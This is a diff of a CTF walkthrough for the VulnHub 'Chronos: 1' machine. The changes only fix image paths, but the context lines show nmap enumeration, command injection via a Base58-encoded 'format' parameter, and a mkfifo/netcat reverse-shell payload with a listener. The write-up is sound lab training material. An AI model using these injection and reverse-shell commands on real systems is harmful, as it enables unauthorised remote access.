@@ -3,7 +3,7 @@
 - **Machine:** Chronos: 1
 - **Download:** https://www.vulnhub.com/entry/chronos-1,735/
 
-![](682-1.png)
+![](images/682-1.png)
 
 ---
 
@@ -23,7 +23,7 @@
 nmap -sn 192.168.31.0/24
 ```
 
-![](682-2.png)
+![](images/682-2.png)
 
 ---
 
@@ -35,7 +35,7 @@ Enumerate all open ports, services, operating system details, and default NSE sc
 nmap -v -p- 192.168.31.3
 ```
 
-![](682-3.png)
+![](images/682-3.png)
 
 ---
 
@@ -45,7 +45,7 @@ nmap -v -p- 192.168.31.3
 nmap -sC -sV -A 192.168.31.3
 ```
 
-![](682-4.png)
+![](images/682-4.png)
 
 ---
 
@@ -57,7 +57,7 @@ Run an aggressive HTTP scan using the `http-enum` NSE script.
 nmap -v -p 80 -sT -sV -A --script=http-enum.nse 192.168.31.3
 ```
 
-![](682-5.png)
+![](images/682-5.png)
 
 ---
 
@@ -74,7 +74,7 @@ Visit the following URLs:
 
 Open the website and press **Ctrl + U** to inspect the source code.
 
-![](682-6.png)
+![](images/682-6.png)
 
 ---
 
@@ -86,7 +86,7 @@ A hidden endpoint is discovered within the page source.
 http://chronos.local:8000/date?format=4ugYDuAkScCG5gMcZjEN3mALyG1dD5ZYsiCfWvQ2w9anYGyL
 ```
 
-![](682-7.png)
+![](images/682-7.png)
 
 ---
 
@@ -94,9 +94,9 @@ http://chronos.local:8000/date?format=4ugYDuAkScCG5gMcZjEN3mALyG1dD5ZYsiCfWvQ2w9
 
 Capture the request in **Burp Suite** and send it to **Repeater** for further testing.
 
-![](682-8.png)
+![](images/682-8.png)
 
-![](682-9.png)
+![](images/682-9.png)
 
 ---
 
@@ -108,7 +108,7 @@ Update the `User-Agent` header as shown below.
 Chronos
 ```
 
-![](682-10.png)
+![](images/682-10.png)
 
 ---
 
@@ -131,11 +131,11 @@ print(base58.b58encode(b"&& ls").decode())
 EOF
 ```
 
-![](682-11.png)
+![](images/682-11.png)
 
 Replace the `format` parameter with the encoded value and resend the request.
 
-![](682-12.png)
+![](images/682-12.png)
 
 The successful response confirms that command execution is possible.
 
@@ -162,7 +162,7 @@ print(base58.b58encode(b"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc
 EOF
 ```
 
-![](682-13.png)
+![](images/682-13.png)
 
 ---
 
@@ -178,7 +178,7 @@ nc -nlvp 443
 
 Replace the `format` parameter with the Base58-encoded payload in Burp Suite and send the request.
 
-![](682-14.png)
+![](images/682-14.png)
 
 ---
 
@@ -186,7 +186,7 @@ Replace the `format` parameter with the Base58-encoded payload in Burp Suite and
 
 A reverse shell is successfully established.
 
-![](682-15.png)
+![](images/682-15.png)
 
 ---
 
